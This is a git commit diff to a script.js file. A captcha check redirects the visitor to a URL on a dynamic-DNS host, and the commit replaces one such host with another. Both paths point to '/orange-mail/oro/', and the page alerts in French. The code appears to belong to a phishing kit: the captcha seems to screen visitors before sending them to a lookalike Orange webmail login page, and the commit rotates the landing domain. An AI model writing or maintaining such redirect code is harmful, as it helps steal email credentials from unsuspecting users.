815fbeb14707f2c401e1f48b465b0d44bc2bf532
assistancecontact123 <assistance.contact123@free.fr>
2025-02-10 16:13:18 +0000

    Update script.js

--- script.js
+++ script.js
@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://iniklinkorng.mypi.co/orange-mail/oro/";
+        targetURL="https://inik-orgelogin.tftpd.net/orange-mail/oro/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
